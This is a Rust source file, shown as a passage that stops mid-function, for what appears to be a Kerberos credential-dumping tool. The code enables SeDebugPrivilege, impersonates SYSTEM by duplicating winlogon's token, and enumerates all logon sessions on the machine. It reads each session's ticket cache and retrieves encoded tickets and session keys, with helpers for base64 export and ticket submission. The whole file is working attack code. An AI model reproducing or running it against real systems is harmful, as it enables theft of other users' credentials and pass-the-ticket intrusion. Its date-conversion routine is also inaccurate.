#![allow(static_mut_refs)]

use std::env;
use std::fs::File;
use std::io::Write;
use std::mem;
use std::ptr;
use std::slice;

type NTSTATUS = i32;
type HANDLE = isize;
type PVOID = *mut std::ffi::c_void;

const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_STATISTICS: u32 = 10;
const SE_PRIVILEGE_ENABLED: u32 = 0x00000002;
const SECURITY_IMPERSONATION: u32 = 2;
const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
const TH32CS_SNAPPROCESS: u32 = 0x00000002;
const MAXIMUM_ALLOWED: u32 = 0x02000000;
const TOKEN_IMPERSONATION: u32 = 2;

const KERB_QUERY_TKT_CACHE_MESSAGE: u32 = 1;
const KERB_RETRIEVE_ENCODED_TICKET_MESSAGE: u32 = 8;
const KERB_QUERY_TKT_CACHE_EX_MESSAGE: u32 = 14;
const KERB_SUBMIT_TICKET_MESSAGE: u32 = 21;
const KERB_RETRIEVE_TICKET_AS_KERB_CRED: u32 = 0x8;

const TICKET_FLAG_FORWARDABLE: u32 = 0x40000000;
const TICKET_FLAG_FORWARDED: u32 = 0x20000000;
const TICKET_FLAG_PROXIABLE: u32 = 0x10000000;
const TICKET_FLAG_PROXY: u32 = 0x08000000;
const TICKET_FLAG_MAY_POSTDATE: u32 = 0x04000000;
const TICKET_FLAG_POSTDATED: u32 = 0x02000000;
const TICKET_FLAG_INVALID: u32 = 0x01000000;
const TICKET_FLAG_RENEWABLE: u32 = 0x00800000;
const TICKET_FLAG_INITIAL: u32 = 0x00400000;
const TICKET_FLAG_PRE_AUTHENT: u32 = 0x00200000;
const TICKET_FLAG_HW_AUTHENT: u32 = 0x00100000;
const TICKET_FLAG_OK_AS_DELEGATE: u32 = 0x00040000;
const TICKET_FLAG_NAME_CANONICALIZE: u32 = 0x00010000;

#[repr(C)]
#[derive(Copy, Clone, Default)]
struct LUID {
    low_part: u32,
    high_part: i32,
}


#[repr(C)]
#[derive(Clone)]
struct LSA_UNICODE_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}


#[repr(C)]
struct LSA_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u8,
}


#[repr(C)]
struct SECURITY_LOGON_SESSION_DATA {
    size: u32,
    logon_id: LUID,
    user_name: LSA_UNICODE_STRING,
    logon_domain: LSA_UNICODE_STRING,
    authentication_package: LSA_UNICODE_STRING,
    logon_type: u32,
    session: u32,
    sid: PVOID,
    logon_time: i64,
    logon_server: LSA_UNICODE_STRING,
    dns_domain_name: LSA_UNICODE_STRING,
    upn: LSA_UNICODE_STRING,
}


#[repr(C)]
struct TOKEN_STATISTICS {
    token_id: LUID,
    authentication_id: LUID,
    expiration_time: i64,
    token_type: u32,
    impersonation_level: u32,
    dynamic_charged: u32,
    dynamic_available: u32,
    group_count: u32,
    privilege_count: u32,
    modified_id: LUID,
}


#[repr(C)]
struct LUID_AND_ATTRIBUTES {
    luid: LUID,
    attributes: u32,
}


#[repr(C)]
struct TOKEN_PRIVILEGES {
    privilege_count: u32,
    privileges: [LUID_AND_ATTRIBUTES; 1],
}


#[repr(C)]
struct PROCESSENTRY32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}


#[repr(C)]
struct KERB_QUERY_TKT_CACHE_REQUEST {
    message_type: u32,
    logon_id: LUID,
}


#[repr(C)]
struct KERB_QUERY_TKT_CACHE_RESPONSE {
    message_type: u32,
    count_of_tickets: u32,
}


#[repr(C)]
#[derive(Clone)]
struct KERB_TICKET_CACHE_INFO {
    server_name: LSA_UNICODE_STRING,
    realm_name: LSA_UNICODE_STRING,
    start_time: i64,
    end_time: i64,
    renew_time: i64,
    encryption_type: i32,
    ticket_flags: u32,
}


#[repr(C)]
#[derive(Clone)]
struct KERB_TICKET_CACHE_INFO_EX {
    client_name: LSA_UNICODE_STRING,
    client_realm: LSA_UNICODE_STRING,
    server_name: LSA_UNICODE_STRING,
    server_realm: LSA_UNICODE_STRING,
    start_time: i64,
    end_time: i64,
    renew_time: i64,
    encryption_type: i32,
    ticket_flags: u32,
}


#[repr(C)]
struct KERB_CRYPTO_KEY {
    key_type: i32,
    length: u32,
    value: *mut u8,
}


#[repr(C)]
struct KERB_EXTERNAL_NAME {
    name_type: i16,
    name_count: u16,
}


#[repr(C)]
struct SECURITY_HANDLE {
    low_part: PVOID,
    high_part: PVOID,
}


#[repr(C)]
struct KERB_EXTERNAL_TICKET {
    service_name: *mut KERB_EXTERNAL_NAME,
    target_name: *mut KERB_EXTERNAL_NAME,
    client_name: *mut KERB_EXTERNAL_NAME,
    domain_name: LSA_UNICODE_STRING,
    target_domain_name: LSA_UNICODE_STRING,
    alt_target_domain_name: LSA_UNICODE_STRING,
    session_key: KERB_CRYPTO_KEY,
    ticket_flags: u32,
    flags: u32,
    key_expiration_time: i64,
    start_time: i64,
    end_time: i64,
    renew_until: i64,
    time_skew: i64,
    encoded_ticket_size: i32,
    encoded_ticket: *mut u8,
}


#[repr(C)]
struct KERB_RETRIEVE_TKT_RESPONSE {
    ticket: KERB_EXTERNAL_TICKET,
}


#[repr(C)]
struct KERB_CRYPTO_KEY32 {
    key_type: i32,
    length: u32,
    offset: u32,
}


#[repr(C)]
struct KERB_SUBMIT_TKT_REQUEST {
    message_type: u32,
    logon_id: LUID,
    flags: u32,
    key: KERB_CRYPTO_KEY32,
    kerb_cred_size: u32,
    kerb_cred_offset: u32,
}


struct TgtInfo {
    logon_id: u32,
    username: String,
    domain: String,
    service_name: String,
}


static mut G_TGT_LIST: Vec<TgtInfo> = Vec::new();


#[link(name = "kernel32")]
extern "system" {
    fn GetCurrentProcess() -> HANDLE;
    fn OpenProcessToken(process_handle: HANDLE, desired_access: u32, token_handle: *mut HANDLE) -> i32;
    fn CloseHandle(object: HANDLE) -> i32;
    fn GetLastError() -> u32;
    fn OpenProcess(desired_access: u32, inherit_handle: i32, process_id: u32) -> HANDLE;
    fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> HANDLE;
    fn Process32FirstW(snapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> i32;
    fn Process32NextW(snapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> i32;
}


#[link(name = "advapi32")]
extern "system" {
    fn GetTokenInformation(
        token_handle: HANDLE,
        token_information_class: u32,
        token_information: PVOID,
        token_information_length: u32,
        return_length: *mut u32,
    ) -> i32;
    fn LookupPrivilegeValueW(system_name: *const u16, name: *const u16, luid: *mut LUID) -> i32;
    fn AdjustTokenPrivileges(
        token_handle: HANDLE,
        disable_all_privileges: i32,
        new_state: *const TOKEN_PRIVILEGES,
        buffer_length: u32,
        previous_state: *mut TOKEN_PRIVILEGES,
        return_length: *mut u32,
    ) -> i32;
    fn DuplicateToken(
        existing_token_handle: HANDLE,
        impersonation_level: u32,
        duplicate_token_handle: *mut HANDLE,
    ) -> i32;
    fn DuplicateTokenEx(
        existing_token: HANDLE,
        desired_access: u32,
        token_attributes: PVOID,
        impersonation_level: u32,
        token_type: u32,
        new_token: *mut HANDLE,
    ) -> i32;
    fn ImpersonateLoggedOnUser(token: HANDLE) -> i32;
    fn RevertToSelf() -> i32;
}


#[link(name = "secur32")]
extern "system" {
    fn LsaConnectUntrusted(lsa_handle: *mut HANDLE) -> NTSTATUS;
    fn LsaLookupAuthenticationPackage(
        lsa_handle: HANDLE,
        package_name: *const LSA_STRING,
        authentication_package: *mut u32,
    ) -> NTSTATUS;
    fn LsaCallAuthenticationPackage(
        lsa_handle: HANDLE,
        authentication_package: u32,
        protocol_submit_buffer: PVOID,
        submit_buffer_length: u32,
        protocol_return_buffer: *mut PVOID,
        return_buffer_length: *mut u32,
        protocol_status: *mut NTSTATUS,
    ) -> NTSTATUS;
    fn LsaFreeReturnBuffer(buffer: PVOID) -> NTSTATUS;
    fn LsaEnumerateLogonSessions(
        logon_session_count: *mut u32,
        logon_session_list: *mut *mut LUID,
    ) -> NTSTATUS;
    fn LsaGetLogonSessionData(
        logon_id: *const LUID,
        session_data: *mut *mut SECURITY_LOGON_SESSION_DATA,
    ) -> NTSTATUS;
    fn LsaDeregisterLogonProcess(lsa_handle: HANDLE) -> NTSTATUS;
}


#[link(name = "shell32")]
extern "system" {
    fn IsUserAnAdmin() -> i32;
}


fn unicode_string_to_string(unicode_str: &LSA_UNICODE_STRING) -> String {
    if unicode_str.length == 0 || unicode_str.buffer.is_null() {
        return String::new();
    }
    
    unsafe {
        let len = (unicode_str.length / 2) as usize;
        let slice = slice::from_raw_parts(unicode_str.buffer, len);
        String::from_utf16_lossy(slice)
    }
}


fn filetime_to_string(filetime: i64) -> String {
    if filetime == 0 {
        return "01/01/1601 00:00:00".to_string();
    }
    
    let microseconds = filetime / 10;
    let seconds = microseconds / 1_000_000;
    
    let days_since_1601 = seconds / 86400;
    let year = 1601 + (days_since_1601 / 365);
    let day_of_year = days_since_1601 % 365;
    let month = 1 + (day_of_year / 30);
    let day = 1 + (day_of_year % 30);
    
    let remaining_seconds = seconds % 86400;
    let hour = remaining_seconds / 3600;
    let minute = (remaining_seconds % 3600) / 60;
    let second = remaining_seconds % 60;
    
    format!("{:02}/{:02}/{} {:02}:{:02}:{:02}", month, day, year, hour, minute, second)
}


fn format_ticket_flags(flags: u32) -> String {
    let mut flag_names = Vec::new();
    
    if flags & TICKET_FLAG_FORWARDABLE != 0 { flag_names.push("forwardable"); }
    if flags & TICKET_FLAG_FORWARDED != 0 { flag_names.push("forwarded"); }
    if flags & TICKET_FLAG_PROXIABLE != 0 { flag_names.push("proxiable"); }
    if flags & TICKET_FLAG_PROXY != 0 { flag_names.push("proxy"); }
    if flags & TICKET_FLAG_MAY_POSTDATE != 0 { flag_names.push("may_postdate"); }
    if flags & TICKET_FLAG_POSTDATED != 0 { flag_names.push("postdated"); }
    if flags & TICKET_FLAG_INVALID != 0 { flag_names.push("invalid"); }
    if flags & TICKET_FLAG_RENEWABLE != 0 { flag_names.push("renewable"); }
    if flags & TICKET_FLAG_INITIAL != 0 { flag_names.push("initial"); }
    if flags & TICKET_FLAG_PRE_AUTHENT != 0 { flag_names.push("pre_authent"); }
    if flags & TICKET_FLAG_HW_AUTHENT != 0 { flag_names.push("hw_authent"); }
    if flags & TICKET_FLAG_OK_AS_DELEGATE != 0 { flag_names.push("ok_as_delegate"); }
    if flags & TICKET_FLAG_NAME_CANONICALIZE != 0 { flag_names.push("name_canonicalize"); }
    
    if flag_names.is_empty() {
        "0".to_string()
    } else {
        flag_names.join(" ")
    }
}


fn get_logon_type_name(logon_type: u32) -> &'static str {
    match logon_type {
        0 => "Unknown",
        2 => "Interactive",
        3 => "Network",
        4 => "Batch",
        5 => "Service",
        7 => "Unlock",
        8 => "NetworkCleartext",
        9 => "NewCredentials",
        10 => "RemoteInteractive",
        11 => "CachedInteractive",
        _ => "(Unknown)",
    }
}


fn get_encryption_type_name(enc_type: i32) -> String {
    match enc_type {
        1 => "DES-CBC-CRC".to_string(),
        3 => "DES-CBC-MD5".to_string(),
        17 => "AES-128-CTS-HMAC-SHA1-96".to_string(),
        18 => "AES-256-CTS-HMAC-SHA1-96".to_string(),
        23 => "RC4-HMAC".to_string(),
        24 => "RC4-HMAC-EXP".to_string(),
        _ => format!("Unknown ({})", enc_type),
    }
}


fn to_base64(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    
    for chunk in data.chunks(3) {
        let b1 = chunk[0];
        let b2 = chunk.get(1).copied().unwrap_or(0);
        let b3 = chunk.get(2).copied().unwrap_or(0);
        
        result.push(CHARS[(b1 >> 2) as usize] as char);
        result.push(CHARS[(((b1 & 0x03) << 4) | (b2 >> 4)) as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[(((b2 & 0x0f) << 2) | (b3 >> 6)) as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[(b3 & 0x3f) as usize] as char } else { '=' });
    }
    
    result
}


fn enable_debug_privilege() -> bool {
    unsafe {
        let mut h_token: HANDLE = 0;
        let h_process = GetCurrentProcess();
        
        if OpenProcessToken(h_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token) == 0 {
            return false;
        }
        
        let mut luid = LUID::default();
        let privilege_name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
        
        if LookupPrivilegeValueW(ptr::null(), privilege_name.as_ptr(), &mut luid) == 0 {
            CloseHandle(h_token);
            return false;
        }
        
        let tp = TOKEN_PRIVILEGES {
            privilege_count: 1,
            privileges: [LUID_AND_ATTRIBUTES {
                luid,
                attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        
        if AdjustTokenPrivileges(h_token, 0, &tp, 0, ptr::null_mut(), ptr::null_mut()) == 0 {
            CloseHandle(h_token);
            return false;
        }
        
        let error = GetLastError();
        CloseHandle(h_token);
        
        if error == 1300 {
            return false;
        }
        
        println!("[+] SeDebugPrivilege enabled successfully");
        true
    }
}


fn get_current_logon_id() -> Option<LUID> {
    unsafe {
        let mut h_token: HANDLE = 0;
        let h_process = GetCurrentProcess();
        
        if OpenProcessToken(h_process, TOKEN_QUERY, &mut h_token) == 0 {
            return None;
        }
        
        let mut stats: TOKEN_STATISTICS = mem::zeroed();
        let mut return_length: u32 = 0;
        
        let result = GetTokenInformation(
            h_token,
            TOKEN_STATISTICS,
            &mut stats as *mut _ as PVOID,
            mem::size_of::<TOKEN_STATISTICS>() as u32,
            &mut return_length,
        );
        
        CloseHandle(h_token);
        
        if result != 0 {
            Some(stats.authentication_id)
        } else {
            None
        }
    }
}


fn print_current_logon_id() {
    if let Some(logon_id) = get_current_logon_id() {
        println!("Current LogonId is {}:0x{:x}", logon_id.high_part, logon_id.low_part);
    }
}


fn get_process_id_of_name(process_name: &str) -> u32 {
    unsafe {
        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == -1 {
            return 0;
        }
        
        let mut pe: PROCESSENTRY32W = mem::zeroed();
        pe.dw_size = mem::size_of::<PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(h_snapshot, &mut pe) == 0 {
            CloseHandle(h_snapshot);
            return 0;
        }
        
        let target_name = process_name.to_lowercase();
        loop {
            let exe_file = String::from_utf16_lossy(&pe.sz_exe_file)
                .trim_end_matches('\0')
                .to_lowercase();
            
            if exe_file == target_name {
                CloseHandle(h_snapshot);
                return pe.th32_process_id;
            }
            
            if Process32NextW(h_snapshot, &mut pe) == 0 {
                break;
            }
        }
        
        CloseHandle(h_snapshot);
        0
    }
}


fn get_system() -> bool {
    let winlogon_pid = get_process_id_of_name("winlogon.exe");
    if winlogon_pid == 0 {
        return false;
    }
    
    unsafe {
        let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogon_pid);
        if h_process == 0 {
            return false;
        }
        
        let mut h_token: HANDLE = 0;
        if OpenProcessToken(h_process, TOKEN_DUPLICATE, &mut h_token) == 0 {
            CloseHandle(h_process);
            return false;
        }
        
        let mut h_dup_token: HANDLE = 0;
        if DuplicateToken(h_token, SECURITY_IMPERSONATION, &mut h_dup_token) == 0 {
            CloseHandle(h_token);
            CloseHandle(h_process);
            return false;
        }
        
        if ImpersonateLoggedOnUser(h_dup_token) == 0 {
            CloseHandle(h_dup_token);
            CloseHandle(h_token);
            CloseHandle(h_process);
            return false;
        }
        
        CloseHandle(h_token);
        CloseHandle(h_dup_token);
        CloseHandle(h_process);
        true
    }
}


fn get_lsa_handle_with_impersonation() -> Option<HANDLE> {
    unsafe {
        let is_admin = IsUserAnAdmin() != 0;
        
        if is_admin {
            if !get_system() {
                return None;
            }
            
            let mut lsa_handle: HANDLE = 0;
            let status = LsaConnectUntrusted(&mut lsa_handle);
            RevertToSelf();
            
            if status != 0 {
                return None;
            }
            
            Some(lsa_handle)
        } else {
            let mut lsa_handle: HANDLE = 0;
            let status = LsaConnectUntrusted(&mut lsa_handle);
            
            if status != 0 {
                None
            } else {
                Some(lsa_handle)
            }
        }
    }
}


fn impersonate_session(target_logon_id: u32) -> Option<HANDLE> {
    unsafe {
        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if h_snapshot == -1 {
            return None;
        }
        
        let mut pe: PROCESSENTRY32W = mem::zeroed();
        pe.dw_size = mem::size_of::<PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(h_snapshot, &mut pe) == 0 {
            CloseHandle(h_snapshot);
            return None;
        }
        
        loop {
            let h_process = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pe.th32_process_id);
            if h_process != 0 {
                let mut h_token: HANDLE = 0;
                if OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, &mut h_token) != 0 {
                    let mut stats: TOKEN_STATISTICS = mem::zeroed();
                    let mut return_length: u32 = 0;
                    
                    if GetTokenInformation(
                        h_token,
                        TOKEN_STATISTICS,
                        &mut stats as *mut _ as PVOID,
                        mem::size_of::<TOKEN_STATISTICS>() as u32,
                        &mut return_length,
                    ) != 0 {
                        if stats.authentication_id.low_part == target_logon_id {
                            let mut h_imp_token: HANDLE = 0;
                            if DuplicateTokenEx(
                                h_token,
                                MAXIMUM_ALLOWED,
                                ptr::null_mut(),
                                SECURITY_IMPERSONATION,
                                TOKEN_IMPERSONATION,
                                &mut h_imp_token,
                            ) != 0 {
                                CloseHandle(h_token);
                                CloseHandle(h_process);
                                CloseHandle(h_snapshot);
                                return Some(h_imp_token);
                            }
                        }
                    }
                    CloseHandle(h_token);
                }
                CloseHandle(h_process);
            }
            
            if Process32NextW(h_snapshot, &mut pe) == 0 {
                break;
            }
        }
        
        CloseHandle(h_snapshot);
        None
    }
}


fn add_tgt_to_list(logon_id: u32, username: String, domain: String, service_name: String) {
    unsafe {
        for tgt in &G_TGT_LIST {
            if tgt.logon_id == logon_id && tgt.service_name == service_name {
                return;
            }
        }
        
        G_TGT_LIST.push(TgtInfo {
            logon_id,
            username: if username.is_empty() { "(unknown)".to_string() } else { username },
            domain: if domain.is_empty() { "(unknown)".to_string() } else { domain },
            service_name: if service_name.is_empty() { "(unknown)".to_string() } else { service_name },
        });
    }
}


fn request_service_ticket(
    lsa_handle: HANDLE,
    auth_pack: u32,
    user_logon_id: LUID,
    target_name: &str,
    ticket_flags: u32,
) -> Option<(Vec<u8>, Vec<u8>, i32)> {
    unsafe {
        let target_name_utf16: Vec<u16> = target_name.encode_utf16().chain(std::iter::once(0)).collect();
        let target_name_len = (target_name_utf16.len() - 1) * 2;
        
        #[repr(C)]
        struct RequestWithName {
            message_type: u32,
            logon_id: LUID,
            target_name: LSA_UNICODE_STRING,
            ticket_flags: u32,
            cache_options: u32,
            encryption_type: i32,
            credentials_handle: SECURITY_HANDLE,
        }
        
        let total_size = mem::size_of::<RequestWithName>() + target_name_len + 2;
        let mut buffer = vec![0u8; total_size];
        
        let request_ptr = buffer.as_mut_ptr() as *mut RequestWithName;
        (*request_ptr).message_type = KERB_RETRIEVE_ENCODED_TICKET_MESSAGE;
        (*request_ptr).logon_id = user_logon_id;
        (*request_ptr).target_name.length = target_name_len as u16;
        (*request_ptr).target_name.maximum_length = (target_name_len + 2) as u16;
        (*request_ptr).ticket_flags = ticket_flags;
        (*request_ptr).cache_options = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        (*request_ptr).encryption_type = 0;
        (*request_ptr).credentials_handle = mem::zeroed();
        
        let name_offset = mem::size_of::<RequestWithName>();
        let name_ptr = buffer.as_mut_ptr().add(name_offset) as *mut u16;
        ptr::copy_nonoverlapping(target_name_utf16.as_ptr(), name_ptr, target_name_utf16.len());
        
        (*request_ptr).target_name.buffer = name_ptr;
        
        let mut response_ptr: PVOID = ptr::null_mut();
        let mut response_size: u32 = 0;
        let mut protocol_status: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            buffer.as_ptr() as PVOID,
            total_size as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );
        
        if status != 0 || protocol_status != 0 || response_size == 0 {
            return None;
        }
        
        let response = &*(response_ptr as *const KERB_RETRIEVE_TKT_RESPONSE);
        
        let ticket_bytes = if response.ticket.encoded_ticket_size > 0 && !response.ticket.encoded_ticket.is_null() {
            slice::from_raw_parts(response.ticket.encoded_ticket, response.ticket.encoded_ticket_size as usize).to_vec()
        } else {
            Vec::new()
        };
        
        let session_key_bytes = if response.ticket.session_key.length > 0 && !response.ticket.session_key.value.is_null() {
            slice::from_raw_parts(response.ticket.session_key.value, response.ticket.session_key.length as usize).to_vec()
        } else {
            Vec::new()
        };
        
        let key_type = response.ticket.session_key.key_type;
        
        LsaFreeReturnBuffer(response_ptr);
        
        Some((ticket_bytes, session_key_bytes, key_type))
    }
}


fn enumerate_logon_sessions() {
    unsafe {
        let mut session_count: u32 = 0;
        let mut session_list: *mut LUID = ptr::null_mut();
        
        let status = LsaEnumerateLogonSessions(&mut session_count, &mut session_list);
        if status != 0 {
            println!("[-] LsaEnumerateLogonSessions failed with status 0x{:08x}", status);
            return;
        }
        
        println!();
        let sessions = slice::from_raw_parts(session_list, session_count as usize);
        
        for (i, session_luid) in sessions.iter().enumerate() {
            let mut session_data_ptr: *mut SECURITY_LOGON_SESSION_DATA = ptr::null_mut();
            let status = LsaGetLogonSessionData(session_luid, &mut session_data_ptr);
            
            if status != 0 || session_data_ptr.is_null() {
                continue;
            }
            
            let session_data = &*session_data_ptr;
            let domain = unicode_string_to_string(&session_data.logon_domain);
            let username = unicode_string_to_string(&session_data.user_name);
            let auth_package = unicode_string_to_string(&session_data.authentication_package);
            let logon_type = session_data.logon_type;
            let logon_type_str = get_logon_type_name(logon_type);
            
            println!(
                "[{}] Session {} {}:0x{:x} {}\\{} {}:{}",
                i,
                session_data.session,
                session_luid.high_part,
                session_luid.low_part,
                domain,
                username,
                auth_package,
                logon_type_str
            );
            
            LsaFreeReturnBuffer(session_data_ptr as PVOID);
        }
        
        LsaFreeReturnBuffer(session_list as PVOID);
    }
}


fn enumerate_my_tickets() {
    unsafe {
        let mut lsa_handle: HANDLE = 0;
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != 0 {
            println!("[-] LsaConnectUntrusted failed: 0x{:08x}", status);
            return;
        }
        
        let pkg_name_str = b"Kerberos\0";
        let pkg_name = LSA_STRING {
            length: (pkg_name_str.len() - 1) as u16,
            maximum_length: pkg_name_str.len() as u16,
            buffer: pkg_name_str.as_ptr() as *mut u8,
        };
        
        let mut auth_pack: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_pack);
        if status != 0 {
            println!("[-] Could not find Kerberos package: 0x{:08x}", status);
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let cache_request = KERB_QUERY_TKT_CACHE_REQUEST {
            message_type: KERB_QUERY_TKT_CACHE_MESSAGE,
            logon_id: LUID { low_part: 0, high_part: 0 },
        };
        
        let mut response_ptr: PVOID = ptr::null_mut();
        let mut response_size: u32 = 0;
        let mut protocol_status: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            &cache_request as *const _ as PVOID,
            mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );
        
        if status != 0 || protocol_status != 0 || response_ptr.is_null() {
            println!("[-] Error querying ticket cache");
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let cache_response = &*(response_ptr as *const KERB_QUERY_TKT_CACHE_RESPONSE);
        let ticket_count = cache_response.count_of_tickets;
        
        println!("Cached Tickets: ({})\n", ticket_count);
        
        if ticket_count == 0 {
            LsaFreeReturnBuffer(response_ptr);
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let logon_id = get_current_logon_id();
        let mut username = "unknown".to_string();
        
        if let Some(luid) = logon_id {
            let mut session_data_ptr: *mut SECURITY_LOGON_SESSION_DATA = ptr::null_mut();
            if LsaGetLogonSessionData(&luid, &mut session_data_ptr) == 0 && !session_data_ptr.is_null() {
                username = unicode_string_to_string(&(*session_data_ptr).user_name);
                LsaFreeReturnBuffer(session_data_ptr as PVOID);
            }
        }
        
        let tickets_offset = mem::size_of::<KERB_QUERY_TKT_CACHE_RESPONSE>();
        let tickets_ptr = (response_ptr as usize + tickets_offset) as *const KERB_TICKET_CACHE_INFO;
        
        for i in 0..ticket_count {
            let ticket = &*tickets_ptr.add(i as usize);
            
            let server_name = unicode_string_to_string(&ticket.server_name);
            let realm_name = unicode_string_to_string(&ticket.realm_name);
            let start_time = filetime_to_string(ticket.start_time);
            let end_time = filetime_to_string(ticket.end_time);
            let renew_time = filetime_to_string(ticket.renew_time);
            let enc_type = get_encryption_type_name(ticket.encryption_type);
            let flags_str = format_ticket_flags(ticket.ticket_flags);
            
            println!("#{}> Client: {} @ {}", i, username, realm_name);
            println!("     Server: {} @ {}", server_name, realm_name);
            println!("     KerbTicket Encryption Type: {}", enc_type);
            println!("     Ticket Flags 0x{:x} -> {}", ticket.ticket_flags, flags_str);
            println!("     Start Time: {} (local)", start_time);
            println!("     End Time:   {} (local)", end_time);
            println!("     Renew Time: {} (local)", renew_time);
            
            if let Some((_, session_key_bytes, key_type)) = request_service_ticket(
                lsa_handle,
                auth_pack,
                LUID { low_part: 0, high_part: 0 },
                &server_name,
                ticket.ticket_flags,
            ) {
                if !session_key_bytes.is_empty() {
                    let key_enc_type = get_encryption_type_name(key_type);
                    println!("     Session Key Type: {}", key_enc_type);
                }
            }
            
            println!("     Cache Flags: 0x1 -> PRIMARY");
            println!("     Kdc Called:\n");
        }
        
        LsaFreeReturnBuffer(response_ptr);
        LsaDeregisterLogonProcess(lsa_handle);
    }
}


fn enumerate_all_tickets(print_tickets: bool) {
    unsafe {
        if print_tickets {
            println!("[*] Action: Dump Kerberos Ticket Data (All Users)\n");
        }
        
        let current_luid = get_current_logon_id();
        if let Some(luid) = current_luid {
            let combined = ((luid.high_part as u64) << 32) | (luid.low_part as u64);
            if print_tickets {
                println!("[*] Current LUID    : 0x{:x}\n", combined);
            }
        }
        
        if print_tickets {
            enable_debug_privilege();
        }
        
        let lsa_handle = match get_lsa_handle_with_impersonation() {
            Some(h) => h,
            None => {
                println!("[-] Error obtaining LSA handle");
                return;
            }
        };
        
        let pkg_name_str = b"Kerberos\0";
        let pkg_name = LSA_STRING {
            length: (pkg_name_str.len() - 1) as u16,
            maximum_length: pkg_name_str.len() as u16,
            buffer: pkg_name_str.as_ptr() as *mut u8,
        };
        
        let mut auth_pack: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_pack);
        if status != 0 {
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let mut session_count: u32 = 0;
        let mut session_list: *mut LUID = ptr::null_mut();
        let status = LsaEnumerateLogonSessions(&mut session_count, &mut session_list);
        if status != 0 {
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        G_TGT_LIST.clear();
        
        let mut total_sessions = 0;
        let mut sessions_with_tickets = 0;
        let mut total_tickets = 0;
        let mut tgt_count = 0;
        let mut service_count = 0;
        
        let sessions = slice::from_raw_parts(session_list, session_count as usize);
        
        for session_luid in sessions {
            let mut session_data_ptr: *mut SECURITY_LOGON_SESSION_DATA = ptr::null_mut();
            let status = LsaGetLogonSessionData(session_luid, &mut session_data_ptr);
            
            if status != 0 || session_data_ptr.is_null() {
                continue;
            }
            
            let session_data = &*session_data_ptr;
            let username = unicode_string_to_string(&session_data.user_name);
            let domain = unicode_string_to_string(&session_data.logon_domain);
            
            if username.is_empty() {
                LsaFreeReturnBuffer(session_data_ptr as PVOID);
                continue;
            }
            
            total_sessions += 1;
            
            let cache_request = KERB_QUERY_TKT_CACHE_REQUEST {
                message_type: KERB_QUERY_TKT_CACHE_EX_MESSAGE,
                logon_id: *session_luid,
            };
            
            let mut response_ptr: PVOID = ptr::null_mut();
            let mut response_size: u32 = 0;
            let mut protocol_status: NTSTATUS = 0;
            
            let status = LsaCallAuthenticationPackage(
                lsa_handle,
                auth_pack,
                &cache_request as *const _ as PVOID,
                mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
                &mut response_ptr,
                &mut response_size,
                &mut protocol_status,
            );
            
            if status != 0 || protocol_status != 0 || response_ptr.is_null() {
                LsaFreeReturnBuffer(session_data_ptr as PVOID);
                continue;
            }
            
            let cache_response = &*(response_ptr as *const KERB_QUERY_TKT_CACHE_RESPONSE);
            let ticket_count = cache_response.count_of_tickets;
            
            if ticket_count == 0 {
                LsaFreeReturnBuffer(response_ptr);
                LsaFreeReturnBuffer(session_data_ptr as PVOID);
                continue;
            }
            
            sessions_with_tickets += 1;
            total_tickets += ticket_count;
            
            if print_tickets {
                let auth_package = unicode_string_to_string(&session_data.authentication_package);
                let logon_type = get_logon_type_name(session_data.logon_type);
                let logon_time = filetime_to_string(session_data.logon_time);
                let logon_server = unicode_string_to_string(&session_data.logon_server);
                let dns_domain = unicode_string_to_string(&session_data.dns_domain_name);
                let upn = unicode_string_to_string(&session_data.upn);
                
                println!("  UserName                 : {}", username);
                println!("  Domain                   : {}", domain);
                println!("  LogonId                  : 0x{:x}", session_luid.low_part);
                println!("  UserSID                  : [SID]");
                println!("  AuthenticationPackage    : {}", auth_package);
                println!("  LogonType                : {}", logon_type);
